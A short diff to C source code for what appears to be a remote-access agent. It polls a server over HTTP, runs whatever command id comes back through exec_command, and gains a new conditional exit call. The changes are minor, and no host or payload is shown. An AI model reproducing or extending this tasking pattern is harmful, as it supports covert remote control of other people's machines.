@@ -1,4 +1,5 @@
 #include "Communication.h"
+#include "Core.h"
 #include "Commands.h"
 
 #include "../Protocol/Packer.h"
@@ -50,7 +51,7 @@ bool boxboxbox(){
     if(!http_response) { MSG("Error in sending post"); goto EXIT; }
     else if(http_response->status == 404) {MSG("404 not found");goto EXIT;}
 
-    uint64_t _tmp= 0;
+    uint64_t _tmp = 0;
     int cmd_id = packer_get_int32((uint8_t *)http_response->response, &_tmp);
     if(cmd_id == COMMAND_NO_JOB || cmd_id == COMMAND_ERR ) { MSG("no job"); goto EXIT;}
     pack = exec_command((uint8_t *)http_response->response, cmd_id); 
@@ -62,6 +63,7 @@ EXIT:
     if(http_response) { http_free(http_response);}
     if(packer) packer_free(packer);
     if(pack) packer_free(pack);
+    if(sett->exit) shaco_exit();
     return success;
 }
 
